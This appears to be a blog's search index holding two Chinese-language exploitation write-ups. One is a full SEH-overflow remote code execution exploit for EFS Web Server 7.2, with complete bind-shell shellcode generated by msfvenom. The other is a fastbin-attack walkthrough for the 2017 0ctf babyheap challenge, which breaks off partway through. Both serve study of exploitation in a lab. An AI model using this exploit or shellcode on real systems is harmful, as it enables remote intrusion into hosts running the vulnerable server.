<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>EFS Web Server 7.2远程代码执行漏洞分析</title>
    <url>/2021/04/20/EFS-Web-Server-7-2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><ul>
<li><p>漏洞软件：EFS Web Server 7.2 GET请求远程代码执行漏洞(SEH)</p>
</li>
<li><p>漏洞链接：<a href="https://www.exploit-db.com/exploits/42261">https://www.exploit-db.com/exploits/42261</a></p>
</li>
<li><p>软件下载：<a href="https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe">https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe</a></p>
</li>
<li><p>利用简述：利用SEH劫持程序执行流到shellcode，难度不大，适合学习windows的SEH漏洞利用</p>
</li>
</ul>
<span id="more"></span>

<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
<li>靶机环境：Windows xp sp3<ul>
<li>EFS Web Server 7.2</li>
<li>windbg</li>
<li>mona</li>
</ul>
</li>
<li>攻击机环境：kali<ul>
<li>pwntools</li>
<li>metasploit</li>
</ul>
</li>
</ul>
<h3 id="2-漏洞复现与分析"><a href="#2-漏洞复现与分析" class="headerlink" title="2. 漏洞复现与分析"></a>2. 漏洞复现与分析</h3><p>编写poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.112.146&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect = s.connect((ip, port))</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&quot;GET &quot;</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">20000</span>, <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用windbg附加漏洞程序，发送poc，触发漏洞</p>
<img src="https://i.loli.net/2021/04/19/JyqaeKvX9k6hmbs.png" alt="image-20210418153647636" style="zoom:80%;" />

<p>查看eax，eax+4c不可读，导致异常</p>
<img src="https://i.loli.net/2021/04/19/m6G3tofeQiqwzbn.png" style="zoom:80%;" />

<p>继续运行，eip指向了0x41414141，同时发现ecx也指向了0x41414141</p>
<img src="https://i.loli.net/2021/04/20/gNoY7fJc2C4XLZj.png" alt="image-20210418153917690" style="zoom:80%;" />

<p>查看栈</p>
<img src="https://i.loli.net/2021/04/20/YlqARutXOypBfiP.png" alt="image-20210418154119141" style="zoom:80%;" />

<p>栈回溯，分别跟踪查看61c277f6，61c6286c，004968EF</p>
<p>用IDA打开sqlite3.dll，查看61c277f6，此处由于访问 eax+4cH 错误，导致异常，重点关注eax即a1，函数传参为a1且没有改变a1的值，所以应回溯上一个函数分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:61C277F6 81 78 4C 97 A6 29+cmp     dword ptr [eax+4Ch], 0A029A697h</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/04/20/kOTh8slbFdCZBXA.png" alt="image-20210418223736206" style="zoom:80%;" />

<p>查看61c6286c后发现应当继续回溯，直到004968EF：因为调用sqlite3_prepare_v2()导致异常，继续回溯查看参数是什么，但是发现windbg上一层函数已被覆盖，应重新调试，在4968D0下断点</p>
<img src="https://i.loli.net/2021/04/20/U7djOvkDQw9rWFK.png" alt="image-20210418224708060" style="zoom:80%;" />

<p>在4968D0断下，逐步运行到004968ef，查看参数，第一个参数this指针为41414141，已经出现异常，需要继续回溯</p>
<img src="https://i.loli.net/2021/04/20/FltwCgi5hesGTE8.png" alt="image-20210418231850935" style="zoom:80%;" />

<p>但栈帧已被畸形数据覆盖，无法查看上一级函数，但是可以查看栈中保存的参数</p>
<img src="https://i.loli.net/2021/04/20/LipWCG5yzBPUr8H.png" alt="image-20210419001344360" style="zoom: 80%;" />

<p>关键字符串 select * from sqltable where name = ‘’sql语句，查找程序中调用这个字符串的函数</p>
<img src="https://i.loli.net/2021/04/20/Elf3hSypePxm8z6.png" alt="image-20210419001805712" style="zoom:80%;" />

<img src="https://i.loli.net/2021/04/20/RB2IUTpVhlyXCOE.png" alt="image-20210419001857984" style="zoom:80%;" />

<p>有两处调用目标字符串00497584、00497748，经排查后确定00497748地址为可疑函数</p>
<img src="https://i.loli.net/2021/04/20/CUBYHcuTmF9MI5h.png" alt="image-20210419002434425" style="zoom:80%;" />

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(&amp;v15, aSelectFromSWhe, Sqltable, v11, a3);</span><br><span class="line">(<span class="keyword">int</span> __thiscall) <span class="built_in">sub_4968D0</span>(v4, (<span class="keyword">int</span>)&amp;v12, (<span class="keyword">int</span>)&amp;v15);</span><br></pre></td></tr></table></figure>

<p>sprintf 函数将格式化后的sql语句存放进栈上的地址v15即01ba5fd4，其中SQL语句保存畸形字符串a3的内容</p>
<p>在windbg中查看sub_4968D0的参数，thiscall调用约定中this保存在ecx</p>
<p>v4 = ecx，&amp;v12 = esp，&amp;v15 = esp+4，此时ecx即01ba7058的地址为畸形字符串，这是由于v15保存的内容覆盖而致</p>
<img src="https://i.loli.net/2021/04/20/qVd63TEQFrcCuxs.png" alt="image-20210419004214855" style="zoom: 80%;" />

<img src="https://i.loli.net/2021/04/20/8klcI1Dgdj7uWpL.png" alt="image-20210419004016087" style="zoom:80%;" />

<p>查看sub_4968D0中sqlite3_prepare_v2函数的参数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sqlite3_prepare_v2</span><span class="params">(*<span class="keyword">this</span>, a3, <span class="number">-1</span>, (<span class="keyword">int</span>)&amp;a3, <span class="number">0</span>)</span></span></span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/04/20/byLxYRmUvpqNZ5u.png" alt="image-20210419004746863" style="zoom:80%;" />

<p>可以看到第一个参数为畸形字符串，在调用sqlite3_prepare_v2函数之前在004968ec将ecx内的值传递给第一个参数，ecx是sub_4968D0传递给sqlite3_prepare_v2的，值为01ba7058</p>
<img src="https://i.loli.net/2021/04/20/ujHAYo7R2JDXVrE.png" alt="image-20210419005135224" style="zoom:80%;" />

<p>继续执行直到触发漏洞，可以得知ecx指向的地址01ba7058保存的是关键内容，前面分析得知程序在00497748处调用sprintf函数将畸形字符串赋值给了v15指向的01ba5fd4一直覆盖到了01ba7058，覆盖了ecx原本关键指针的内容，导致漏洞</p>
<p>漏洞原因总结：在sql语句赋值，由于没有对参数进行有效的检查，导致ecx指针对应的内容被sql语句中畸形变量覆盖，后续对ecx指针内容访问时出现了访问地址异常，进入SEH异常处理流程，导致代码执行</p>
<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><h3 id="1-背景知识"><a href="#1-背景知识" class="headerlink" title="1. 背景知识"></a>1. 背景知识</h3><p>SEH即Windows结构化异常处理程序，用于处理程序发生的错误或异常，SEH结构存放在栈中，多个 SEH 通过链表指针在栈内由栈顶向栈底串成单向链表，发生异常时，程序顺着最近的SEH链表依次尝试其他异常处理函数，这里引用《0day安全》中的图</p>
<img src="https://i.loli.net/2021/04/20/mpT1Qg76MAuxner.png" alt="image-20210419231727911" style="zoom:80%;" />

<p>当程序执行异常处理函数时，函数创建自己的栈帧，会把next SEH的地址压入栈中，正好时esp+8的位置，那么我们劫持程序执行流方法为把异常处理函数改为pop_pop_ret的gadget，执行之后会跳转到next_seh处执行，将next_seh的值改为跳转到shellcode的代码，即可实现程序处理异常时执行shellcode的目的。这种攻击方法能够绕过SafeSEH。有关SEH攻击的内容可参考《0day安全》的第6.1和11章</p>
<img src="https://i.loli.net/2021/04/20/XcUEz28SNC7Zj9u.png" alt="image-20210419234650285" style="zoom:80%;" />

<h3 id="2-利用流程"><a href="#2-利用流程" class="headerlink" title="2. 利用流程"></a>2. 利用流程</h3><p>exploit整体思路：程序触发异常后跳转到handler后执行pop_pop_ret，跳转到NSEH执行jmp2shellcode，进而执行shelldcode</p>
<img src="https://i.loli.net/2021/04/20/tLCRUo9Gapvq1KT.png" alt="image-20210419234820696" style="zoom:80%;" />

<p>写exploit步骤</p>
<p>发送最初的poc，查看seh链，确定seh的位置4061</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!exchain</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/04/20/AIrY4E6P238jUcW.png" alt="image-20210419163918885" style="zoom:80%;" />

<p>使用mona插件在内存中寻找用于攻击seh的gadget，pop_pop_ret</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!py mona seh</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/04/20/Fce9VMjwEamdstR.png" alt="image-20210419123938830" style="zoom:80%;" />

<p>选择一个可执行的地址0x100103fe，编写exploit的雏形</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.112.146&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect = s.connect((ip, port))</span><br><span class="line"></span><br><span class="line">nseh = <span class="string">&quot;NSEH&quot;</span></span><br><span class="line">pop_pop_ret = <span class="number">0x100103fe</span></span><br><span class="line">shellcode = <span class="string">&#x27;B&#x27;</span>*<span class="number">8000</span></span><br><span class="line">payload = flat(<span class="string">&quot;GET &quot;</span>, cyclic(<span class="number">4061</span>), nseh, pop_pop_ret, shellcode, <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">s.recv(<span class="number">1024</span>) </span><br></pre></td></tr></table></figure>

<p>发送exploit可以看到seh链的nseh指针指向了”NESH”，seh handler指向了0x100103fe</p>
<img src="https://i.loli.net/2021/04/20/gfM461oIazUPWHn.png" alt="image-20210419124137558" style="zoom:80%;" />

<p>在0x100103fe处设置断点，使进程运行到断点处，会执行pop esi，pop edi，ret三条语句，返回到01bafd4即NESH</p>
<img src="https://i.loli.net/2021/04/20/LqDuQaEo5G1YBPr.png" alt="image-20210419124316451" style="zoom:80%;" />

<p>使NSEH跳转到shellcode，jmp 0x12 = \xeb\x12</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nesh = <span class="string">&quot;\xeb\x12\x90\x90&quot;</span></span><br></pre></td></tr></table></figure>

<p>排除坏字符：”\x20\x2b\x2f\x5c” 分别为 “ +/\”，可能这些字符在创建sql语句时进行了特殊处理</p>
<p>生成shellcode</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp LPORT=4444 -b &#x27;\x00\x20\x2b\x2f\x5c&#x27;  -n 0x20 -f py</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.112.146&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect = s.connect((ip, port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#msfvenom -p windows/shell_bind_tcp LPORT=4444 -b &#x27;\x00\x20\x2b\x2f\x5c&#x27; -n 0x20 -f py</span></span><br><span class="line">buf =  <span class="string">b&quot;\x90&quot;</span>*<span class="number">0xc</span></span><br><span class="line">buf += <span class="string">b&quot;\xf9\x92\x4a\xf9\x41\xfc\x9b\x9b\x92\x4a\x48\xf9\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x43\x90\x4a\x37\x41\x37\x98\x91\x49\x41\x4b\x91\x93&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf5\xfd\x43\x48\x90\x27\xda\xc1\xbd\xa1\x9e\x47\x62&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x53\x83\xc2\x04\x31&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x6a\x13\x03\xcb\x8d\xa5\x97\xf7\x5a\xab\x58\x07\x9b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xcc\xd1\xe2\xaa\xcc\x86\x67\x9c\xfc\xcd\x25\x11\x76&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x83\xdd\xa2\xfa\x0c\xd2\x03\xb0\x6a\xdd\x94\xe9\x4f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7c\x17\xf0\x83\x5e\x26\x3b\xd6\x9f\x6f\x26\x1b\xcd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x38\x2c\x8e\xe1\x4d\x78\x13\x8a\x1e\x6c\x13\x6f\xd6&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x8f\x32\x3e\x6c\xd6\x94\xc1\xa1\x62\x9d\xd9\xa6\x4f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x57\x52\x1c\x3b\x66\xb2\x6c\xc4\xc5\xfb\x40\x37\x17&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x3c\x66\xa8\x62\x34\x94\x55\x75\x83\xe6\x81\xf0\x17&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x40\x41\xa2\xf3\x70\x86\x35\x70\x7e\x63\x31\xde\x63&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x72\x96\x55\x9f\xff\x19\xb9\x29\xbb\x3d\x1d\x71\x1f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5f\x04\xdf\xce\x60\x56\x80\xaf\xc4\x1d\x2d\xbb\x74&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7c\x3a\x08\xb5\x7e\xba\x06\xce\x0d\x88\x89\x64\x99&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa0\x42\xa3\x5e\xc6\x78\x13\xf0\x39\x83\x64\xd9\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd7\x34\x71\xd7\x57\xdf\x81\xd8\x8d\x4a\x89\x7f\x7e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x69\x74\x3f\x2e\x2d\xd6\xa8\x24\xa2\x09\xc8\x46\x68&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x22\x61\xbb\x93\x5d\x2e\x32\x75\x37\xde\x12\x2d\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x1c\x41\xe6\x48\x5e\xa3\x5e\xfe\x17\xa5\x59\x01\xa8&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe3\xcd\x95\x23\xe0\xc9\x84\x33\x2d\x7a\xd1\xa4\xbb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xeb\x90\x55\xbb\x21\x42\xf5\x2e\xae\x92\x70\x53\x79&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc5\xd5\xa5\x70\x83\xcb\x9c\x2a\xb1\x11\x78\x14\x71&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xce\xb9\x9b\x78\x83\x86\xbf\x6a\x5d\x06\x84\xde\x31&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x51\x52\x88\xf7\x0b\x14\x62\xae\xe0\xfe\xe2\x37\xcb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc0\x74\x38\x06\xb7\x98\x89\xff\x8e\xa7\x26\x68\x07&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd0\x5a\x08\xe8\x0b\xdf\x38\xa3\x11\x76\xd1\x6a\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xca\xbc\x8c\x3f\x08\xb9\x0e\xb5\xf1\x3e\x0e\xbc\xf4&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7b\x88\x2d\x85\x14\x7d\x51\x3a\x14\x54&quot;</span></span><br><span class="line"></span><br><span class="line">nseh = <span class="string">b&quot;\xeb\x12\x90\x90&quot;</span>  <span class="comment">#jmp 0x12</span></span><br><span class="line">pop_pop_ret = <span class="number">0x100103fe</span>    <span class="comment">#pop pop ret ImageLoad.dll (WinXP SP3)</span></span><br><span class="line">buf += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">8000</span> 		<span class="comment">#确保payload足够以长触发漏洞</span></span><br><span class="line">payload = flat(<span class="string">&quot;GET &quot;</span>, cyclic(<span class="number">4061</span>), nseh, pop_pop_ret, buf, <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure>

<p>发送payload，攻击成功</p>
<img src="https://i.loli.net/2021/04/20/ziNX3VkbFBd1QG8.png" alt="image-20210419154925886" style="zoom:80%;" />

<p>个人总结：</p>
<p>逆向漏洞的时候应一级一级的回溯，如果发现无法继续向前回溯，可以在能回溯的最后一级查看寄存器栈等参数寻找有用信息，比如关键字符串。漏洞利用过程主要学习了seh，在排除坏字符的时候发现了很多问题，原因的sql语句将payload中一部分内容进行了处理，所以这里需要结合更多知识进行思考。</p>
<h2 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a>四、参考文献</h2><ul>
<li><p><a href="https://www.freebuf.com/articles/system/170703.html">https://www.freebuf.com/articles/system/170703.html</a></p>
</li>
<li><p><a href="https://blog.csdn.net/u012763794/article/details/66970749">https://blog.csdn.net/u012763794/article/details/66970749</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>远程代码执行</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastbin Attack之2017 0ctf babyheap</title>
    <url>/2021/04/03/2017%200ctf%20babyheap%20WriteUp/</url>
    <content><![CDATA[<p>这道题是fastbin_attack经典题，也是我认为有一定难度的题，有两种解法，这里只详细记录了一种，主要知识点有</p>
<ul>
<li>fastbin_attack</li>
<li>libc基地址泄露</li>
<li>__malloc_hook</li>
<li>size错位构造<span id="more"></span></li>
</ul>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap">题目链接</a></p>
<h3 id="一、逆向分析"><a href="#一、逆向分析" class="headerlink" title="一、逆向分析"></a>一、逆向分析</h3><p>检查保护措施：64位程序，保护全开</p>
<img src="https://i.loli.net/2021/04/02/EqWyOHQVic1zg5X.png" style="zoom:80%;" />

<h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><p>程序通过sub_B70()函数获取一段连续的存储堆分配索引表的空间</p>
<img src="https://i.loli.net/2021/04/02/lmrWsDn3VGzf7pS.png" style="zoom:80%;" />

<h4 id="allocate函数"><a href="#allocate函数" class="headerlink" title="allocate函数"></a>allocate函数</h4><p>根据用户输入分配堆空间，地址存储到索引表中，一块索引的信息是24字节，第一个8字节记录此索引是否被使用，第二个8字节代表分配的大小，第三个8字节是分配的地址，指向chunk</p>
<p>这里分配内存使用calloc，会将内存置0</p>
<img src="https://i.loli.net/2021/04/02/s1w3n9NECGo4SiH.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/04/02/c1bA6NgZzIHBymX.png" style="zoom:80%;" />

<h4 id="Fill函数"><a href="#Fill函数" class="headerlink" title="Fill函数"></a>Fill函数</h4><p>没有对用户输入的size过滤，存在堆溢出漏洞</p>
<img src="https://i.loli.net/2021/04/02/vg4JdRtiCoQ1ruG.png" style="zoom:80%;" />

<h4 id="Free函数和Dump函数"><a href="#Free函数和Dump函数" class="headerlink" title="Free函数和Dump函数"></a>Free函数和Dump函数</h4><p>Free函数释放内存空间，同时将索引表中指针置0，不存在uaf漏洞</p>
<p>dump 就是输出对应索引 chunk 的内容，注意读取内容的大小实在索引表中的记录的大小，也就是一开始分配的大小，不是chunk的size字段大小</p>
<h3 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h3><p>思路：存在任意长度堆溢出，首先泄露libc基地址，通过fastbin_attack篡改一个函数指针，调用这个函数获取shell</p>
<h4 id="泄露libc基地址"><a href="#泄露libc基地址" class="headerlink" title="泄露libc基地址"></a>泄露libc基地址</h4><p>free掉一个chunk到bin中，通过泄露fd和bk指针获取main_arena地址计算出libc_base，fastbin_chunk单向链表只有一个指针fd指向链尾，而main_arena的地址在表头，fastbin的fd指针不会指向main_arena，需有bk指针才能指向表头，所以需要一个双向链表的结构：unsorted_bin</p>
<p>泄露条件：</p>
<ul>
<li><p>使用dump函数读取chunk中的fd和bk指针，读取的chunk必须已经分配</p>
</li>
<li><p>分配内存时使用calloc函数，会将chunk置空，fd和bk也被置空，这与上一条矛盾，因此calloc的chunk不能与free的chunk相同，这就需要使用堆溢出欺骗内存</p>
</li>
</ul>
<p>思路一：使用chunk_extend扩展一个堆，使其与free_chunk重叠，读取扩展的chunk获取free_chunk的fd和bk指针。<del>但是读取的大小的内存在分配的时候已经固定，不能扩大，意味着扩展的内容无法读取此路不通！</del>  这是另一种方法，见文章解法二</p>
<p>思路二：fastbin_attack，欺骗fast_bin的指针指向同一个已经calloc的chunk，再次calloc这个内存，使得一张索引表里有两个指针指向同一个chunk，只需要将一个free掉，令一个dump读取fd和bk指针即可。注意：分配的chunk是fastbin，free的必须为unsorted_bin</p>
<h5 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#indec 2</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index 3 分配unsorted_bin</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#fastbin_attack</span></span><br><span class="line">extend_0 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x21</span>, <span class="string">b&#x27;\x60&#x27;</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(extend_0), extend_0)</span><br></pre></td></tr></table></figure>

<p>申请3个chunk和1个大小不属于fastbin 的chunk，释放index1和index2</p>
<img src="https://i.loli.net/2021/04/02/bOjfWtH91qnoLzX.png" style="zoom:80%;" />

<p>堆溢出之后，在fastbin中 index1_chunk的fd指针原本指向index2_chunk，改成指向index3_chunk</p>
<img src="https://i.loli.net/2021/04/02/28a7Yyo9SqFPbjh.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/04/02/tzZkic5bHaQDBT9.png" style="zoom:80%;" />

<p>下一步将要分配fastbin中的两个chunk，第二个申请到的就是指向index3_chunk，使得索引表中index2_chunk指向index3_chunk。</p>
<p>fastbin绕过size检查：fastbin表中每一条链中chunk是固定大小，从表中malloc出一个chunk，拆卸前会检查size大小是否属于当前链中，不属于则报错。fastbin_attack时需要在拆卸前将chunk大小改为当前链的大小，绕过size检测</p>
<p>当我需要通过index2_chunk溢出到index3_chunk的size字段时，原本的index2_chunk释放之后没有分配不能写入数据，所以重新构造chunk，在index3_chunk之前多分配一个0x10的chunk，用于溢出，示意图如下</p>
<img src="https://i.loli.net/2021/04/02/OBscS3w59PyAdLT.png" style="zoom: 80%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 0 to fastbin</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 1 to fastbin</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 2 to fastbin</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 3 to fastbin &lt;-------新增加的chunk</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index 4 to unsorted_bin</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">extend_0 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x21</span>, <span class="string">b&#x27;\x80&#x27;</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(extend_0), extend_0)</span><br><span class="line"><span class="comment">#修改为fastbins大小，用于分配</span></span><br><span class="line">extend_3 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(extend_3), extend_3)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<p>新分配之后index2_chunk和index4_chunk指向0x90的chunk</p>
<img src="https://i.loli.net/2021/04/02/YuLx9dwrFTRkyUE.png" style="zoom:80%;" />

<p>索引表已经存在两个指针指向0x90的chunk，那么到了泄露地址最后一步，free掉index4_chunk使其进入unsorted_bin，读取index2获得index4的fd和bk指针，获取main_arena的地址</p>
<p>细节：将index4_chunk大小更改回到0x91，free掉index4之前为了防止其与top_chunk合并，需要新分配一个任意大小的chunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改回fastbins大小，用于释放到unsorted_bin</span></span><br><span class="line">extend_3 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(extend_3), extend_3)</span><br><span class="line"><span class="comment">#分配一个chunk防止unsorted_chunk与top_chunk合并</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">unsorted_main_arena = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(unsorted_main_arena))</span><br></pre></td></tr></table></figure>

<p>在64位系统中unsorted_bin在main_arena+88的位置，32位为main_arena+48</p>
<blockquote>
<p>这个通过free一个0x90大小chunk到unsorted_bin中，查看fd和bk指针可以看到</p>
</blockquote>
<p>main_arena在glibc_2.23的0x3c4b20地址：使用IDA打开glibc_2.23的malloc_trim()函数，main_arena存储在glibc_2.23的.data段</p>
<img src="https://i.loli.net/2021/04/02/lU3TYQRXuEV2oIa.png" style="zoom:80%;" />

<p>对照glibc_2.23源码</p>
<img src="https://i.loli.net/2021/04/02/piN2moHy8xgAOLS.png" style="zoom:80%;" />

<p>libc基地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">main_arena = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = unsorted_main_arena - (main_arena + <span class="number">88</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc base addr: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/04/02/ZlwpfiGo1WADa7r.png" style="zoom:80%;" />

<h4 id="hook劫持"><a href="#hook劫持" class="headerlink" title="hook劫持"></a>hook劫持</h4><p>往常通过fastbin attack进行got表劫持，这里有两点限制got劫持：</p>
<ul>
<li><p>RELRO全开，将GOT表属性设置为不可写</p>
</li>
<li><p>fastbin如果指向got表，为了通过size校验需要有一个合适的size字段，但是got表中难以找到</p>
</li>
</ul>
<p>这里我们选择hook劫持：</p>
<blockquote>
<p>hook是钩子函数，设计钩子函数的初衷是用于调试，基本格式大体是func_hook(*func,&lt;参数&gt;)，在调用某函数时，如果函数的钩子存在，就会先去执行该函数的钩子函数，通过钩子函数再来回调我们当初要调用的函数，calloc函数与malloc函数的钩子都是malloc_hook</p>
</blockquote>
<p>glibc_2.23中malloc实现</p>
<img src="https://i.loli.net/2021/04/02/qIWQoNVhr1gYtmO.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/04/02/yYqVmX7AB6PvNR1.png" style="zoom:80%;" />

<p>calloc中也都存在malloc_hook函数判断执行，所以调用malloc/calloc函数是都会先判断hook函数是否存在，存在则先调用malloc_hook</p>
<p>为了实现fastbin_attack，是fd指针指向__malloc_hook，需要在附近在其低地址找到合法的size段绕过安全检测，先来查看 _malloc_hook附近的布局</p>
<img src="https://i.loli.net/2021/04/02/hSY1L9AEifvgDkF.png"  />

<img src="https://i.loli.net/2021/04/02/PZe329FhGdEMYoj.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/04/02/vOUiJ2coFfE3uk8.png" style="zoom:80%;" />

